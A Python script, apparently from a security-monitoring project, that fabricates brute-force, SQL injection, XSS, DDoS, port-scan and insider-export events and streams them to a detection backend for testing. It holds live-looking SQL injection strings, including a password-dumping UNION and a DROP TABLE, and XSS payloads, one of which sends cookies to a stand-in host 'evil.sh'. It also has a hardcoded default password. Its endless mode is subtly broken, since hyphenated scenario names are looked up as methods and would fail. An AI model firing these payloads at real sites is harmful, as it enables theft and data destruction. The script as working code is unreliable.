"""SentinelX standalone log simulator.

Generates realistic security events and streams them into the SentinelX
backend (POST /api/logs/batch). Mirrors the scenarios available through the
built-in /api/simulator endpoints, but runs fully outside the JVM.

Usage:
    python simulate.py --list
    python simulate.py --scenario brute-force --count 3
    python simulate.py --scenario ddos --count 2 --interval 2
    python simulate.py --all --interval 5          # endless mixed traffic
    python simulate.py --normal-ratio 0.7 --all    # 70% benign traffic

Requires: Python 3.9+ and `requests` (pip install requests).
"""

import argparse
import random
import sys
import time
import uuid
from datetime import datetime, timezone

import requests

ATTACKER_IPS = [
    "45.33.32.156",
    "185.220.101.34",
    "91.240.118.172",
    "103.208.220.11",
]
INTERNAL_USERS = ["alice", "bob", "admin", "svc_backup", "root", "dev_jenkins"]
SQL_PAYLOADS = [
    "' OR '1'='1",
    "105 OR 1=1 UNION SELECT username,password FROM users--",
    "'; DROP TABLE sessions;--",
    "1' AND SLEEP(5)--",
]
XSS_PAYLOADS = [
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=fetch('//evil.sh/'+document.cookie)>",
    "\"><svg onload=alert(1)>",
]
PATHS = [
    "/", "/products", "/search", "/api/catalog", "/cart", "/checkout",
    "/profile", "/api/orders", "/blog", "/help",
]


def now_iso():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


class Simulator:
    def __init__(self, base_url, username, password):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        resp = self.session.post(
            f"{self.base_url}/api/auth/login",
            json={"username": username, "password": password},
            timeout=10,
        )
        if resp.status_code != 200:
            sys.exit(f"Login failed ({resp.status_code}): {resp.text[:300]}")
        token = resp.json()["token"]
        self.session.headers["Authorization"] = f"Bearer {token}"
        print(f"[+] Authenticated as '{username}' against {self.base_url}")

    def _event(self, *, source_ip="10.0.0.10", dest_ip="10.0.0.10", username="-",
               endpoint=None, method="GET", status=200, protocol="HTTPS", port=443,
               bytes_=500, failed_attempts=0, event_type="HTTP_REQUEST",
               raw_message=None):
        return {
            "eventId": f"EVT-{uuid.uuid4().hex[:12].upper()}",
            "timestamp": now_iso(),
            "sourceIp": source_ip,
            "destinationIp": dest_ip,
            "username": username,
            "source": "simulator-cli",
            "endpoint": endpoint,
            "httpMethod": method,
            "status": status,
            "protocol": protocol,
            "port": port,
            "bytes": bytes_,
            "failedAttempts": failed_attempts,
            "eventType": event_type,
            "rawMessage": raw_message,
        }

    def send(self, events):
        if not events:
            return []
        resp = self.session.post(
            f"{self.base_url}/api/logs/batch",
            json={"events": events},
            timeout=60,
        )
        if resp.status_code not in (200, 201):
            print(f"[-] Batch rejected ({resp.status_code}): {resp.text[:200]}")
            return []
        return resp.json()

    # ---------------- benign traffic ----------------

    def normal_traffic(self):
        events = []
        for _ in range(random.randint(4, 10)):
            pick = random.random()
            user = random.choice(INTERNAL_USERS)
            if pick < 0.25:
                events.append(self._event(
                    username=user, endpoint="/api/login", method="POST", status=200,
                    bytes_=random.randint(900, 1500), event_type="LOGIN_SUCCESS"))
            else:
                events.append(self._event(
                    username=user if random.random() < .6 else "-",
                    endpoint=random.choice(PATHS),
                    status=200 if random.random() > .05 else 404,
                    bytes_=random.randint(300, 8000)))
        return self.send(events)

    # ---------------- attack scenarios ----------------

    def brute_force(self):
        ip = random.choice(ATTACKER_IPS)
        target_user = random.choice(INTERNAL_USERS)
        events = [self._event(
            source_ip=ip, username=target_user, endpoint="/api/login", method="POST",
            status=401, bytes_=180, failed_attempts=i + 1, event_type="LOGIN_FAILED",
            raw_message=f"Failed password for {target_user} from {ip} ssh2")
            for i in range(8)]
        print(f"    brute-force: 8 failed logins for '{target_user}' from {ip}")
        return self.send(events)

    def sql_injection(self):
        ip = random.choice(ATTACKER_IPS)
        payload = random.choice(SQL_PAYLOADS)
        path = random.choice(["/products?id=", "/search?q=", "/users?name="])
        encoded = payload.replace(" ", "%20").replace("'", "%27")
        events = [
            self._event(source_ip=ip, endpoint=f"{path}{encoded}", method="GET",
                        status=random.choice([500, 200]), bytes_=random.randint(400, 700),
                        event_type="HTTP_REQUEST",
                        raw_message=f"GET {path}{payload}"),
            self._event(source_ip=ip, endpoint=path + "1%20UNION%20SELECT%20NULL,version()--",
                        method="GET", status=500, bytes_=420, event_type="HTTP_ERROR",
                        raw_message="SQL error: syntax at or near UNION"),
        ]
        print(f"    sql-injection: payloads from {ip}")
        return self.send(events)

    def xss_attempt(self):
        ip = random.choice(ATTACKER_IPS)
        payload = random.choice(XSS_PAYLOADS)
        events = [self._event(
            source_ip=ip, username="guest", endpoint="/comments", method="POST",
            status=200, bytes_=520, event_type="HTTP_REQUEST",
            raw_message=f'POST /comments body={{"text":"{payload}"}}')]
        print(f"    xss: script injection from {ip}")
        return self.send(events)

    def ddos_burst(self):
        ip = random.choice(ATTACKER_IPS)
        n = random.randint(90, 130)
        batch_size = 50
        total = []
        for offset in range(0, n, batch_size):
            chunk = [self._event(
                source_ip=ip, endpoint=f"/api/catalog?page={i % 5}", method="GET",
                status=200, bytes_=90, port=443)
                for i in range(offset, min(offset + batch_size, n))]
            total.extend(self.send(chunk))
        print(f"    ddos: {n} requests/s burst from {ip}")
        return total

    def port_scan(self):
        ip = random.choice(ATTACKER_IPS)
        base = random.randint(1000, 1500)
        step = random.choice([1, 2, 7])
        count = random.randint(15, 30)
        events = [self._event(
            source_ip=ip, method="TCP", status=0, bytes_=40, protocol="TCP",
            port=base + i * step, event_type="CONNECTION_ATTEMPT",
            raw_message=f"TCP SYN {ip}:{base + i * step}")
            for i in range(count)]
        print(f"    port-scan: {count} ports probed on 10.0.0.10 from {ip}")
        return self.send(events)

    def insider_anomaly(self):
        user = random.choice(["svc_backup", "root"])
        ip = "10.0.2.15"
        events = [
            self._event(
                source_ip=ip, dest_ip="10.0.5.30", username=user,
                endpoint="/files/export/finances_q2.zip", method="GET", status=200,
                bytes_=random.randint(600_000_000, 900_000_000),
                event_type="FILE_DOWNLOAD",
                raw_message="Bulk export outside business hours with valid credentials"),
            self._event(
                source_ip=ip, dest_ip="10.0.5.30", username=user,
                endpoint="/files/download/all_projects.tar.gz", method="GET", status=200,
                bytes_=random.randint(900_000_000, 1_400_000_000),
                event_type="FILE_DOWNLOAD"),
        ]
        print(f"    insider-anomaly: mass export by '{user}' from {ip}")
        return self.send(events)

    SCENARIOS = {
        "brute-force": brute_force,
        "sql-injection": sql_injection,
        "xss": xss_attempt,
        "ddos": ddos_burst,
        "port-scan": port_scan,
        "insider-anomaly": insider_anomaly,
    }


def summarize(outcomes, scenario):
    alerts = [a for o in outcomes for a in (o.get("alerts") or [])]
    incidents = {i for o in outcomes for i in (o.get("incidentIds") or [])}
    anomalies = sum(1 for o in outcomes if o.get("aiAnomaly"))
    print(f"  [{scenario}] events={len(outcomes)} alerts={len(alerts)} "
          f"incidents={len(incidents)} ai_anomalies={anomalies}")
    for a in alerts[:5]:
        print(f"      ALERT {a.get('attackType')} sev={a.get('severity')} "
              f"risk={a.get('riskScore')} via={a.get('method')}")


def main():
    parser = argparse.ArgumentParser(description="SentinelX traffic simulator")
    parser.add_argument("--url", default="http://localhost:8080", help="Backend base URL")
    parser.add_argument("--username", default="analyst", help="API login username")
    parser.add_argument("--password", default="Analyst@123", help="API login password")
    parser.add_argument("--scenario", help="Attack scenario to run")
    parser.add_argument("--count", type=int, default=1, help="Repeats of the scenario")
    parser.add_argument("--interval", type=float, default=3.0, help="Seconds between rounds")
    parser.add_argument("--all", action="store_true", help="Endless mixed-traffic mode")
    parser.add_argument("--normal-ratio", type=float, default=0.5,
                        help="Fraction of benign rounds in --all mode (0..1)")
    parser.add_argument("--list", action="store_true", help="List scenarios and exit")
    args = parser.parse_args()

    sim = Simulator(args.url, args.username, args.password)

    if args.list:
        print("Scenarios:", ", ".join(Simulator.SCENARIOS))
        return

    rng = random.Random()

    if args.scenario:
        fn = Simulator.SCENARIOS.get(args.scenario)
        if not fn:
            sys.exit(f"Unknown scenario '{args.scenario}'. Options: "
                     f"{', '.join(Simulator.SCENARIOS)}")
        for i in range(args.count):
            summarize(fn(sim), args.scenario)
            if i < args.count - 1:
                time.sleep(args.interval)
        return

    if args.all:
        print("Endless mode — Ctrl+C to stop.")
        names = list(Simulator.SCENARIOS)
        round_no = 0
        try:
            while True:
                round_no += 1
                print(f"--- round {round_no} ---")
                summarize(sim.normal_traffic(), "normal")
                if rng.random() >= args.normal_ratio:
                    name = rng.choice(names)
                    summarize(getattr(sim, name)(sim), name)
                time.sleep(args.interval)
        except KeyboardInterrupt:
            print("\n[+] Stopped.")
        return

    parser.print_help()


if __name__ == "__main__":
    main()
